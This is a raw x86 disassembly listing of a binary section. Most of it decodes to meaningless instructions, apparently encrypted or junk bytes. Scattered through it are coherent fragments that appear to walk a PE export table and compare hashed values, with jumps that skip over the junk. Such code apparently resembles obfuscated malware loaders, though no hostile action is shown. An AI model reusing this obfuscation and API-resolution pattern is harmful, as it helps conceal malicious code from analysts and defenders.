  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [ebp+0x7f607e08],esi
  4020a6:	add    bh,BYTE PTR [esi+0x7e]
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	sti    
  4020ae:	xor    DWORD PTR ds:0xa24aa392,eax
  4020b4:	leave  
  4020b5:	out    dx,eax
  4020b6:	and    DWORD PTR [edx+0x1dd1c1f4],0x38c485d9
  4020c0:	sti    
  4020c1:	in     eax,dx
  4020c2:	mov    eax,0x1b8c7646
  4020c7:	test   DWORD PTR [ecx],0x3e606feb
  4020cd:	push   eax
  4020ce:	test   ecx,ebx
  4020d0:	ins    BYTE PTR es:[edi],dx
  4020d1:	fsub   QWORD PTR [ebx+0x5a]
  4020d4:	jecxz  0x4020aa
  4020d6:	lods   eax,DWORD PTR gs:[esi]
  4020d8:	sbb    BYTE PTR [ebx-0x6c],dh
  4020db:	inc    esi
  4020dc:	ret    0xd60f
  4020df:	jecxz  0x40208d
  4020e1:	es and eax,0x3ac50045
  4020e7:	push   esp
  4020e8:	sub    BYTE PTR [esi],al
  4020ea:	pusha  
  4020eb:	or     esp,DWORD PTR ds:0xab99c62b
  4020f1:	adc    dh,BYTE PTR [edx+edx*4]
  4020f4:	xchg   ecx,eax
  4020f5:	clc    
  4020f6:	mov    bl,0xfa
  4020f8:	mov    al,es:0xd37c6d33
  4020fe:	jae    0x4020aa
  402100:	ins    DWORD PTR es:[edi],dx
  402101:	clc    
  402102:	out    0xe8,al
  402104:	push   ecx
  402105:	mov    esi,0xc435f800
  40210a:	cmc    
  40210b:	lea    ebx,[esp+ebp*2-0x6bb988db]
  402112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402113:	cld    
  402114:	adc    cl,BYTE PTR [eax]
  402116:	xchg   ecx,eax
  402117:	push   es
  402118:	loope  0x40212b
  40211a:	sub    eax,ebp
  40211c:	ss jecxz 0x402170
  40211f:	mov    cl,0x71
  402121:	push   0x98dadb1e
  402126:	and    DWORD PTR [ecx],0xffffff92
  402129:	bound  esp,QWORD PTR [eax-0x462f7362]
  40212f:	cmp    al,0xf0
  402131:	pushf  
  402132:	in     al,0xd6
  402134:	inc    edx
  402135:	cmp    BYTE PTR [edx-0xa0719ce],0xcf
  40213c:	add    al,BYTE PTR [eax]
  40213e:	mov    edi,0x1058411
  402143:	lahf   
  402144:	jp     0x40214d
  402146:	icebp  
  402147:	mov    esp,0x474dce92
  40214c:	(bad)  
  40214d:	loop   0x40211a
  40214f:	cmp    ah,BYTE PTR [ecx+0x3f099af7]
  402155:	push   0x1169b1e1
  40215a:	jo     0x402155
  40215c:	pusha  
  40215d:	xor    ebp,0x27b913c5
  402163:	stos   BYTE PTR es:[edi],al
  402164:	push   ecx
  402165:	ss adc al,al
  402168:	es xchg ebx,eax
  40216a:	test   ecx,esp
  40216c:	pop    edx
  40216d:	shl    BYTE PTR [ebp-0x61dc28a9],1
  402173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402174:	mov    WORD PTR [esi+esi*8+0x26],gs
  402178:	test   al,0x36
  40217a:	leave  
  40217b:	int    0x43
  40217d:	lods   al,BYTE PTR ds:[esi]
  40217e:	and    al,0x2
  402180:	js     0x40215b
  402182:	dec    ebp
  402183:	mov    ?,WORD PTR [edi-0x26abdd03]
  402189:	xor    DWORD PTR [edx+edi*4],0x8d75e8d2
  402190:	in     al,0x83
  402192:	xchg   edx,eax
  402193:	nop
  402194:	ins    DWORD PTR es:[edi],dx
  402195:	addr16 es out dx,eax
  402198:	lahf   
  402199:	(bad)  
  40219a:	push   0x6c
  40219c:	jns    0x402205
  40219e:	xchg   ebx,eax
  40219f:	popf   
  4021a0:	aas    
  4021a1:	imul   eax,DWORD PTR [esi],0xa76b91ff
  4021a7:	mov    BYTE PTR [edx+ecx*2+0x5d2aa205],bl
  4021ae:	and    ch,BYTE PTR [ebp-0x9729cda]
  4021b4:	ins    DWORD PTR es:[edi],dx
  4021b5:	sti    
  4021b6:	sahf   
  4021b7:	lock xrelease xor DWORD PTR [ecx+0x6b],ebp
  4021bc:	pop    esi
  4021bd:	pop    ecx
  4021be:	and    DWORD PTR [esi+0x33],0xffffffda
  4021c2:	shr    DWORD PTR [eax],0xd9
  4021c5:	fist   DWORD PTR [edi]
  4021c7:	mov    ecx,0x1e2a2ec8
  4021cc:	cmp    cl,BYTE PTR [edx+edi*1]
  4021cf:	mov    edi,0xe2e4c541
  4021d4:	call   0xcd62e281
  4021d9:	push   ds
  4021da:	sbb    edx,DWORD PTR [edx+0x7b]
  4021dd:	xlat   BYTE PTR ds:[ebx]
  4021de:	xchg   ebx,eax
  4021df:	(bad)  [esi-0x4a]
  4021e2:	lods   al,BYTE PTR ds:[esi]
  4021e3:	call   0xfeba:0xc8273dec
  4021ea:	jae    0x402253
  4021ec:	inc    esi
  4021ed:	imul   edx,DWORD PTR [ecx+edx*1+0x2d],0x1b9fcb04
  4021f5:	test   DWORD PTR [ebp+0x72c62ff2],0x50e2a871
  4021ff:	out    dx,eax
  402200:	sub    DWORD PTR [esi],0xffffffa9
  402203:	test   eax,0xea80245c
  402208:	sub    BYTE PTR [esi-0x53],al
  40220b:	jbe    0x40221f
  40220d:	jp     0x4021ce
  40220f:	out    0x3d,eax
  402211:	(bad)  
  402212:	sbb    DWORD PTR [edx+0x2099f95e],esi
  402218:	pop    ebx
  402219:	mov    al,ds:0x2f86e44c
  40221e:	mov    ebp,0xe68b3e43
  402223:	jmp    0x211f6b16
  402228:	jbe    0x402269
  40222a:	xchg   BYTE PTR [edx],bh
  40222c:	sbb    ecx,ebx
  40222e:	adc    ebx,DWORD PTR [eax+0xa]
  402231:	mov    eax,0xfe566f5c
  402236:	popf   
  402237:	fsubr  DWORD PTR [esi+0xb]
  40223a:	je     0x402227
  40223c:	dec    esp
  40223d:	xchg   edi,eax
  40223e:	in     eax,0x22
  402240:	cmc    
  402241:	shl    DWORD PTR [ebx-0x61a05982],1
  402247:	fisub  DWORD PTR [ebx]
  402249:	dec    ebp
  40224a:	adc    BYTE PTR [eax-0x5661d11c],0x2e
  402251:	adc    DWORD PTR [edi-0x2f],eax
  402254:	xor    DWORD PTR [edi],ebp
  402256:	sub    cl,0x55
  402259:	enter  0x2cf1,0x16
  40225d:	ffree  st(0)
  40225f:	xchg   esi,eax
  402260:	mov    ah,0x22
  402262:	adc    BYTE PTR [eax-0x3b2769a],al
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	(bad)  
  4022cb:	push   esp
  4022cc:	or     DWORD PTR [edx-0x4a],0xb57e7e03
  4022d3:	jg     0x402353
  4022d5:	jle    0x4022d0
  4022d7:	retf   0xa08f
  4022da:	mov    ebx,0xf6c0b1a9
  4022df:	adc    dl,BYTE PTR [ebx]
  4022e1:	jbe    0x402360
  4022e3:	loopne 0x402280
  4022e5:	xor    DWORD PTR [ecx+0x3c],ebp
  4022e8:	dec    eax
  4022e9:	loop   0x4022b2
  4022eb:	xor    DWORD PTR [ebx],ebp
  4022ed:	or     DWORD PTR [ecx-0x742c2229],ebp
  4022f3:	xor    esi,esp
  4022f5:	mov    edx,0xe595d9c5
  4022fa:	and    eax,0xe1ede723
  4022ff:	mov    DWORD PTR [ecx+edi*4],edx
  402302:	inc    eax
  402303:	ja     0x4022b1
  402305:	leave  
  402306:	sub    DWORD PTR [esi+0x16],ecx
  402309:	lods   eax,DWORD PTR ds:[esi]
  40230a:	lds    ebx,FWORD PTR [eax+0x51065981]
  402310:	idiv   DWORD PTR [edx-0x8e988eb]
  402316:	and    esp,DWORD PTR [ecx+0x59]
  402319:	(bad)  
  40231a:	xchg   esp,eax
  40231b:	sub    DWORD PTR [ebp+0x37],ebx
  40231e:	cmp    al,0x5d
  402320:	mov    ?,WORD PTR [eax]
  402322:	in     al,dx
  402323:	xor    esp,DWORD PTR [eax]
  402325:	aaa    
  402326:	and    eax,0x89a9b036
  40232b:	push   eax
  40232c:	push   esp
  40232d:	in     eax,0x46
  40232f:	fs in  al,0x8e
  402332:	scas   eax,DWORD PTR es:[edi]
  402333:	pop    eax
  402334:	call   0x23f2:0xdd070754
  40233b:	pop    esi
  40233c:	sub    DWORD PTR [ecx+eax*4-0x760ff719],edi
  402343:	pop    esi
  402344:	stos   BYTE PTR es:[edi],al
  402345:	dec    ecx
  402346:	push   cs
  402347:	sub    eax,DWORD PTR [ecx+0x61]
  40234a:	shl    BYTE PTR [ebx-0x39],1
  40234d:	xlat   BYTE PTR ds:[ebx]
  40234e:	jmp    0xa146:0x7e546386
  402355:	and    ebx,DWORD PTR [ecx]
  402357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402358:	lds    eax,FWORD PTR [ecx-0x20334b73]
  40235e:	outs   dx,BYTE PTR ds:[esi]
  40235f:	mov    ebx,0xe929876f
  402364:	(bad)  
  402365:	ja     0x402324
  402367:	(bad)  [ecx]
  402369:	mov    al,dh
  40236b:	imul   edi,DWORD PTR [ecx+0x40e8d3e1],0x65
  402372:	mov    dl,0x8f
  402374:	adc    BYTE PTR [ecx+ecx*1],0x68
  402378:	xchg   esi,eax
  402379:	dec    edx
  40237a:	imul   ebx,DWORD PTR [edx-0x724b9b87],0x5
  402381:	jl     0x4023be
  402383:	shl    DWORD PTR [ebx+0x138e5a84],0xb3
  40238a:	rcr    BYTE PTR ds:0x2e800a62,cl
  402390:	sbb    BYTE PTR ds:0xbadc0c4d,ch
  402396:	clc    
  402397:	(bad)  
  402398:	(bad)  [eax+0x3934507]
  40239e:	rcl    DWORD PTR [ebx-0x7d],cl
  4023a1:	jbe    0x4023d8
  4023a3:	cwde   
  4023a4:	mov    al,ds:0x73107f6d
  4023a9:	ja     0x402345
  4023ab:	js     0x40240b
  4023ad:	mov    bh,0x74
  4023af:	xor    DWORD PTR [edx-0x1f],esp
  4023b2:	js     0x4023ff
  4023b4:	addr16 (bad) 
  4023b7:	in     al,0xc0
  4023b9:	out    0x19,eax
  4023bb:	popa   
  4023bc:	pop    esi
  4023bd:	shl    DWORD PTR [ecx],1
  4023bf:	add    esi,DWORD PTR [ebx+0x7be9648b]
  4023c5:	es mov eax,cs
  4023c8:	clc    
  4023c9:	scas   al,BYTE PTR es:[edi]
  4023ca:	push   ebp
  4023cb:	sub    cl,al
  4023cd:	pop    esi
  4023ce:	pop    es
  4023cf:	mov    dh,0x18
  4023d1:	hlt    
  4023d2:	mov    ecx,0x435f36a
  4023d7:	(bad)  
  4023d8:	jns    0x4023ac
  4023da:	push   es
  4023db:	into   
  4023dc:	pop    eax
  4023dd:	cdq    
  4023de:	jnp    0x402416
  4023e0:	mov    ?,WORD PTR [ecx+0x3bb383ec]
  4023e6:	mov    esi,0x2b528802
  4023eb:	dec    esi
  4023ec:	jl     0x4023b2
  4023ee:	lods   al,BYTE PTR ds:[esi]
  4023ef:	push   0x675b634c
  4023f4:	(bad)  
  4023f6:	shl    BYTE PTR [ebp-0x3e],0xaa
  4023fa:	cmp    al,0x8
  4023fc:	rcr    ebx,cl
  4023fe:	outs   dx,DWORD PTR ds:[esi]
  4023ff:	xor    DWORD PTR [eax],edi
  402401:	push   0x1e
  402403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402404:	cs pop ebx
  402406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402407:	mov    WORD PTR [edx],ss
  402409:	into   
  40240a:	mov    al,ds:0xc41a62af
  40240f:	stc    
  402410:	das    
  402411:	pop    edx
  402412:	ins    BYTE PTR es:[edi],dx
  402413:	dec    ebp
  402414:	adc    ch,al
  402416:	mov    dl,0xb5
  402418:	cmp    ebx,edi
  40241a:	add    BYTE PTR [edi+0x50],al
  40241d:	rcr    DWORD PTR [ebx+0x7d0cae0f],1
  402423:	push   eax
  402424:	shr    ebx,cl
  402426:	bound  ecx,QWORD PTR [edi-0x2d]
  402429:	cmc    
  40242a:	jge    0x4023c4
  40242c:	pushf  
  40242d:	cmp    ebx,edi
  40242f:	mov    al,0x76
  402431:	idiv   BYTE PTR [ecx-0x46]
  402434:	mov    DWORD PTR [eax+ecx*1],ebp
  402437:	mov    ah,BYTE PTR [ecx+esi*4-0x63]
  40243b:	mov    eax,ds:0x7fdfef8e
  402440:	in     al,dx
  402441:	fisubr WORD PTR [ecx+edx*4-0x6f6fc839]
  402448:	fimul  WORD PTR [eax+ebp*1-0x6a]
  40244c:	push   esi
  40244d:	jmp    0xdea2498a
  402452:	jle    0x402427
  402454:	iret   
  402455:	dec    eax
  402456:	cdq    
  402457:	mov    eax,ds:0x37a33d75
  40245c:	mov    al,ds:0xf419742e
  402461:	pop    ebp
  402462:	data16 mov dl,BYTE PTR [ebx]
  402465:	out    0xe8,al
  402467:	scas   eax,DWORD PTR es:[edi]
  402468:	sar    DWORD PTR [ebp-0x3a995d77],0x1d
  40246f:	(bad)  
  402470:	cmc    
  402471:	fcomp  DWORD PTR ds:0xc706af41
  402477:	test   al,0xe7
  402479:	jns    0x40242a
  40247b:	icebp  
  40247c:	fadd   QWORD PTR [edx+0x7]
  40247f:	xor    eax,0x2af6e6ed
  402484:	mov    bh,0x67
  402486:	jns    0x4024fc
  402488:	push   0xae5dc26b
  40248d:	mov    ecx,DWORD PTR [ebp-0x8]
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xb1321793
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	or     WORD PTR [ebp-0x65],sp
  4024dd:	xchg   esp,eax
  4024de:	jle    0x402482
  4024e0:	xor    ecx,DWORD PTR [ebx]
  4024e2:	dec    ebx
  4024e3:	leave  
  4024e4:	cld    
  4024e5:	popa   
  4024e6:	inc    esi
  4024e7:	adc    BYTE PTR [esi-0x48cee3e4],ah
  4024ed:	pop    ds
  4024ee:	sub    DWORD PTR [edi+0x39],0xffffffe0
  4024f2:	mov    ?,ebp
  4024f4:	mov    ds:0x98b09116,eax
  4024f9:	mov    eax,0x99aa3d94
  4024fe:	add    cl,BYTE PTR [eax+edx*4]
  402501:	mov    cs,ebx
  402503:	mov    eax,0x4149018d
  402508:	cld    
  402509:	dec    ecx
  40250a:	scas   al,BYTE PTR es:[edi]
  40250b:	(bad)  
  40250c:	jno    0x4024e9
  40250e:	mov    BYTE PTR [edx-0x1c8bb3ba],al
  402514:	pop    eax
  402515:	repz push ebp
  402518:	gs push edi
  40251a:	add    ebx,0xc73dabe3
  402520:	out    dx,eax
  402521:	mov    dh,0x37
  402523:	pop    ebx
  402524:	or     DWORD PTR [ecx-0x23827dce],eax
  40252a:	add    al,BYTE PTR [ebp+0x66]
  40252d:	sub    eax,0x6818eb4e
  402532:	and    BYTE PTR [ebp-0x6],dh
  402535:	pop    edx
  402536:	stc    
  402537:	outs   dx,DWORD PTR ds:[esi]
  402538:	popf   
  402539:	(bad)  
  40253a:	jge    0x4025aa
  40253c:	adc    bh,bh
  40253e:	stc    
  40253f:	fcomp  DWORD PTR [esi]
  402541:	sbb    bh,BYTE PTR [edi+0x5e]
  402544:	repz add edx,edx
  402547:	push   esi
  402548:	jmp    0x3d582be0
  40254d:	add    al,0x81
  40254f:	aaa    
  402550:	jae    0x4025a9
  402552:	mov    ds:0x5876f3fa,al
  402557:	in     al,0xc9
  402559:	add    BYTE PTR [ebx+0x52cafdf1],dl
  40255f:	inc    ecx
  402560:	inc    ebx
  402561:	mov    ds:0xf376311,eax
  402566:	fimul  DWORD PTR [ebx]
  402568:	mov    esp,DWORD PTR [ebx]
  40256a:	dec    esp
  40256b:	mov    ds:0xaad5853c,al
  402570:	xchg   edx,eax
  402571:	leave  
  402572:	fwait
  402573:	push   ds
  402574:	xchg   ecx,eax
  402575:	xor    BYTE PTR [ecx-0x1d5dd824],0xb2
  40257c:	inc    eax
  40257d:	dec    ebp
  40257e:	or     eax,0x79ba89f
  402583:	mov    bl,0x29
  402585:	es jg  0x4025cd
  402588:	cmp    ah,bh
  40258a:	aad    0xd7
  40258c:	enter  0xe2af,0xdb
  402590:	(bad)  
  402591:	mov    esi,0xd2b22de3
  402596:	je     0x402534
  402598:	sbb    eax,0xdff1378a
  40259d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40259e:	arpl   di,cx
  4025a0:	or     cl,0x17
  4025a3:	jb     0x4025b0
  4025a5:	jmp    0xa5d535cb
  4025aa:	mov    edx,fs
  4025ac:	sbb    DWORD PTR [ebx],eax
  4025ae:	jns    0x402552
  4025b0:	mov    ebx,0xb8e630ca
  4025b5:	enter  0x6e60,0x3a
  4025b9:	mov    DWORD PTR [edx+0x3495200f],edi
  4025bf:	xchg   DWORD PTR [eax+edi*1+0x72],esp
  4025c3:	popf   
  4025c4:	repz ds dec esp
  4025c7:	test   DWORD PTR [edx],0x5440a0b3
  4025cd:	push   ss
  4025ce:	jnp    0x402619
  4025d0:	or     al,0x8d
  4025d2:	aad    0xca
  4025d4:	loop   0x4025a7
  4025d6:	dec    edi
  4025d7:	inc    edi
  4025d8:	inc    ebx
  4025d9:	loop   0x4025f0
  4025db:	arpl   WORD PTR [eax-0x19],bx
  4025de:	aam    0x9e
  4025e0:	repz push esp
  4025e2:	test   al,0xdc
  4025e4:	lea    ebp,[ebx]
  4025e6:	jp     0x402623
  4025e8:	pop    es
  4025e9:	nop
  4025ea:	enter  0xb7b4,0x57
  4025ee:	test   BYTE PTR [ebx+0x2e],dh
  4025f1:	xchg   ecx,esi
  4025f3:	inc    ebp
  4025f4:	xchg   ebx,eax
  4025f5:	cli    
  4025f6:	clc    
  4025f7:	(bad)  
  4025f8:	jmp    0x402626
  4025fa:	shr    DWORD PTR [ecx+edx*2-0x24f0e032],0xb6
  402602:	cli    
  402603:	cwde   
  402604:	push   ecx
  402605:	pop    ebp
  402606:	icebp  
  402607:	fs js  0x40258a
  40260a:	les    eax,FWORD PTR [ebx+edi*8+0x4cddefc5]
  402611:	rol    al,cl
  402613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402614:	or     BYTE PTR [esi],0xef
  402617:	and    DWORD PTR [edi],eax
  402619:	and    eax,0x50ea327
  40261e:	xchg   ecx,eax
  40261f:	pcmpeqd mm1,QWORD PTR [ecx]
  402622:	adc    BYTE PTR [esi],dl
  402624:	xor    al,BYTE PTR [esi+0x344898b1]
  40262a:	jbe    0x402610
  40262c:	hlt    
  40262d:	inc    ebx
  40262e:	lock jmp 0x4025ff
  402631:	sub    BYTE PTR [ecx-0x6d028f8a],dl
  402637:	call   0x6f62:0xce557ac5
  40263e:	xor    bh,BYTE PTR [ecx+0x3d]
  402641:	xor    al,0x93
  402643:	popf   
  402644:	fdiv   st,st(4)
  402646:	outs   dx,BYTE PTR ds:[esi]
  402647:	pop    es
  402648:	cmp    eax,0xb5c1d815
  40264d:	mov    DWORD PTR [edx],eax
  40264f:	adc    al,0x60
  402651:	xchg   esp,eax
  402652:	loop   0x40262a
  402654:	add    DWORD PTR [edi+0x66],0xb8513a83
  40265b:	les    edi,FWORD PTR [edx+0x7917018f]
  402661:	test   al,0x37
  402663:	retf   0x24d2
  402666:	out    0x7e,eax
  402668:	xchg   ebx,eax
  402669:	mov    ds:0xdd778972,al
  40266e:	inc    DWORD PTR [esi+eiz*8]
  402671:	dec    edi
  402672:	jmp    0xa463:0xe0929de0
  402679:	outs   dx,DWORD PTR ds:[esi]
  40267a:	push   esi
  40267b:	data16 loope 0x4026f9
  40267e:	lea    ebx,[esi-0x4b0485c8]
  402684:	or     BYTE PTR ds:0xc760a353,cl
  40268a:	jmp    0x8926:0xb154f315
  402691:	dec    ebp
  402692:	loopne 0x40261f
  402694:	inc    ebp
  402695:	loopne 0x402622
  402697:	dec    ebp
  402698:	clc    
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x23
  4026c9:	push   0xffffff8d
  4026cb:	in     al,dx
  4026cc:	and    al,0xf
  4026ce:	jle    0x40274e
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	ret    
  4026d5:	hlt    
  4026d6:	hlt    
  4026d7:	pop    ss
  4026d8:	mov    esp,0x35509613
  4026dd:	mov    cl,BYTE PTR [eax-0x5c]
  4026e0:	or     dl,BYTE PTR [eax]
  4026e2:	xlat   BYTE PTR ds:[ebx]
  4026e3:	aaa    
  4026e4:	sub    DWORD PTR cs:[edx+0x22],eax
  4026e8:	sub    BYTE PTR [ebx-0x66c60a15],bh
  4026ee:	les    edi,FWORD PTR ds:0x516b6d28
  4026f4:	adc    dl,BYTE PTR [esi]
  4026f6:	mov    DWORD PTR [ecx+0x1c],esp
  4026f9:	mov    DWORD PTR [esi-0x5ee2d72f],edi
  4026ff:	aas    
  402700:	sub    eax,0x4ec84df4
  402705:	adc    DWORD PTR [esi+0x113d43bc],esp
  40270b:	stos   DWORD PTR es:[edi],eax
  40270c:	cmp    eax,0xb55aff03
  402711:	cmp    bh,BYTE PTR [ecx]
  402713:	std    
  402714:	and    al,0xb3
  402716:	adc    eax,0xffffffaa
  402719:	cmp    BYTE PTR [edi-0x230c0128],ch
  40271f:	mov    esi,edx
  402721:	loop   0x40278d
  402723:	mov    al,0x18
  402725:	xchg   edi,eax
  402726:	test   eax,0xc93ea01
  40272b:	pop    esp
  40272c:	push   esp
  40272d:	iret   
  40272e:	loope  0x4026ff
  402730:	sub    edx,DWORD PTR [edi-0x13f00955]
  402736:	add    ebp,DWORD PTR [edi+edx*2]
  402739:	adc    dh,BYTE PTR [esi+ebp*8-0x743e256a]
  402740:	ins    BYTE PTR es:[edi],dx
  402741:	sbb    al,0x24
  402743:	or     al,0x2b
  402745:	or     cl,bl
  402747:	cmp    bl,BYTE PTR [esi+0x22]
  40274a:	hlt    
  40274b:	icebp  
  40274c:	jne    0x40278e
  40274e:	fadd   st,st(0)
  402750:	ret    
  402751:	je     0x40275b
  402753:	sbb    eax,0xe88322f
  402758:	out    dx,eax
  402759:	sbb    al,BYTE PTR [ecx]
  40275b:	ins    DWORD PTR es:[edi],dx
  40275c:	in     eax,dx
  40275d:	add    al,0x78
  40275f:	sti    
  402760:	lock xchg ebp,eax
  402762:	adc    dh,dl
  402764:	adc    al,BYTE PTR [ebp-0x7dea28a2]
  40276a:	add    eax,0x274c850f
  40276f:	jb     0x4027da
  402771:	mov    al,0x15
  402773:	stos   BYTE PTR es:[edi],al
  402774:	mov    ecx,0xf8a08774
  402779:	scas   eax,DWORD PTR es:[edi]
  40277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277b:	(bad)  
  40277d:	lods   eax,DWORD PTR ds:[esi]
  40277e:	cmp    al,0x14
  402780:	fstp   TBYTE PTR [ebp+esi*2+0x36]
  402784:	pushf  
  402785:	sti    
  402786:	mov    al,BYTE PTR [ebx+0x40bd9dca]
  40278c:	(bad)  
  40278d:	call   0xb344:0xd12a2cab
  402794:	stc    
  402795:	push   es
  402796:	lds    ecx,FWORD PTR [ebx]
  402798:	jb     0x4027ac
  40279a:	jae    0x4027a9
  40279c:	sub    al,0xc5
  40279f:	xlat   BYTE PTR ds:[ebx]
  4027a0:	(bad)  
  4027a1:	cmc    
  4027a2:	mov    eax,0xc5980a5e
  4027a7:	pusha  
  4027a8:	hlt    
  4027a9:	imul   ebx,ebp,0xffffffd2
  4027ac:	mov    edi,0x746a7667
  4027b1:	out    0xc6,eax
  4027b3:	sub    cl,BYTE PTR [edx]
  4027b5:	aaa    
  4027b6:	xchg   esi,eax
  4027b7:	aad    0x86
  4027b9:	les    esi,FWORD PTR [ebx+edi*4+0x682c882a]
  4027c0:	xchg   bh,dl
  4027c2:	daa    
  4027c3:	js     0x402794
  4027c5:	cli    
  4027c6:	lea    ebx,[ecx]
  4027c8:	loope  0x402834
  4027ca:	das    
  4027cb:	(bad)  
  4027cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027cd:	or     DWORD PTR [edi-0x17abaf6d],edi
  4027d3:	shl    DWORD PTR [edi-0x24],1
  4027d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027d7:	out    dx,eax
  4027d8:	rcr    ah,0x42
  4027db:	lods   al,BYTE PTR ds:[esi]
  4027dc:	add    eax,0x88c9ca31
  4027e1:	pop    ebx
  4027e2:	rcl    esi,0x0
  4027e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e6:	(bad)  
  4027e7:	out    dx,al
  4027e8:	or     eax,0x5f0701e1
  4027ed:	sub    ch,BYTE PTR [ebp+esi*2-0xb2d639e]
  4027f4:	ror    BYTE PTR [ecx+0x6d],cl
  4027f7:	inc    ebx
  4027f8:	ror    DWORD PTR [esi],cl
  4027fa:	ins    BYTE PTR es:[edi],dx
  4027fb:	lods   al,BYTE PTR ds:[esi]
  4027fc:	xor    al,0x73
  4027fe:	cmp    ebx,DWORD PTR [esi-0x64]
  402801:	jmp    0xd50d6fd9
  402806:	scas   eax,DWORD PTR es:[edi]
  402807:	daa    
  402808:	out    dx,eax
  402809:	jnp    0x4027f5
  40280b:	fdiv   QWORD PTR [edi-0x2a838205]
  402811:	xor    eax,0x3d05b76d
  402816:	mov    dh,0x6f
  402818:	mov    bl,0xa8
  40281a:	imul   DWORD PTR [edx-0x69]
  40281d:	stos   BYTE PTR es:[edi],al
  40281e:	or     esp,edi
  402820:	dec    ebp
  402821:	or     ch,ch
  402823:	inc    eax
  402824:	inc    esp
  402825:	push   edi
  402826:	clc    
  402827:	mov    esi,ds
  402829:	retf   0x1143
  40282c:	or     BYTE PTR [edi],dh
  40282e:	test   DWORD PTR [ecx+0x66e1444a],edi
  402834:	int    0xb3
  402836:	daa    
  402837:	mov    ds:0xdabcfcf,eax
  40283c:	(bad)  
  40283f:	push   ecx
  402840:	cmp    BYTE PTR [esi-0x5e],cl
  402843:	les    esi,FWORD PTR [edi]
  402845:	ret    
  402846:	repnz sbb BYTE PTR [edi+0x12d9096],0x94
  40284e:	fstp   QWORD PTR [eax+0x635033dc]
  402854:	pushf  
  402855:	cmp    dh,ch
  402857:	rcl    BYTE PTR [ebx+0x458aa5c5],0x7d
  40285e:	aad    0x17
  402860:	jmp    0x8327:0xeed5ee4f
  402867:	in     al,0xf2
  402869:	scas   eax,DWORD PTR es:[edi]
  40286a:	cmp    al,0xff
  40286c:	mov    esp,0x25192060
  402871:	push   ss
  402872:	jl     0x402824
  402874:	stos   DWORD PTR es:[edi],eax
  402875:	cmp    ecx,DWORD PTR [edx-0x53b7560d]
  40287b:	sub    DWORD PTR [ecx],ebp
  40287d:	add    DWORD PTR [ebx+0x49],esp
  402880:	pop    ebx
  402881:	mov    dl,0x36
  402883:	cmp    al,0x4a
  402885:	fsub   QWORD PTR [eax-0x2b]
  402888:	scas   eax,DWORD PTR es:[edi]
